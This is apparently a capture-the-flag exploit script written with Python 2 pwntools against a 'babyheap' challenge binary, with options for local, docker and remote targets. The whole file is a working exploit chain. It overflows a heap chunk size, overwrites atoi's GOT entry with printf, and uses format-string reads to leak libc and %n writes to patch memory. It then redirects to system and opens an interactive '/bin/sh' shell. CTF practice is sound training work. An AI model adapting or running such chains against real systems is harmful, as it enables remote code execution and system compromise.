from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./babyheap"
LIBC = "../libc.so.6"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
#context.log_level='debug'

def recvmenu(conn):
    conn.recvuntil("choice:")

def newfn(conn, sz, cnt, nm):
    recvmenu(conn)
    conn.sendline("1")
    conn.recvuntil(" :")
    conn.sendline(str(sz))
    conn.recvuntil(":")
    conn.send(cnt)
    conn.recvuntil(":")
    conn.send(nm)
    conn.recvline()
    return

def delfn(conn):
    recvmenu(conn)
    conn.sendline("2")

def editfn(conn, cnt):
    recvmenu(conn)
    conn.sendline("3")
    conn.recvuntil(":")
    conn.send(cnt)

def exitfn(conn, s):
    recvmenu(conn)
    conn.sendline("4")
    conn.recvuntil("n)")
    conn.sendline(s)

def exploit(conn, elf, libc, local):
    payload = ""
    payload += "n"*8
    payload += "A" * (0x1010 - 0x18 - 0x20)
    payload += "AAAAAAAA" # prevsize
    payload += p64(0x101) # size
    exitfn(conn, payload)

    newfn(conn, 0x100 - 8, p64(0x21) * (0x100/8), "A"*8)
    delfn(conn)

    payload = ""
    payload += "A"*48
    payload += p64(elf.got['atoi'])
    newfn(conn, 0x100 - 8, payload, "/bin/sh")

    payload = ""
    payload += p64(elf.plt['printf'])
    editfn(conn, payload)

    recvmenu(conn)
    conn.send("%9$sAAAA" + p64(elf.got['puts']))
    putsaddr = u64(conn.recv(6).ljust(8, '\x00'))
    libc.address = putsaddr - libc.symbols['puts']
    log.info("libc address: 0x%x" % libc.address)

    recvmenu(conn)
    conn.send("%9$nAAAA" + p64(0x6020A4))
    recvmenu(conn)
    conn.send("%9$nAAAA" + p64(0x6020A8))

    recvmenu(conn)
    conn.send("AAA")
    conn.send(p64(libc.symbols['system']))

    recvmenu(conn)
    conn.sendline("/bin/sh\x00")

    conn.interactive()
    conn.close()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("honj.in", 4024)
            r = remote(H, P)
            libc = ELF(LIBC)
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC)
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC)
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC)
        pause()
        exploit(r, elf, libc, local=True)
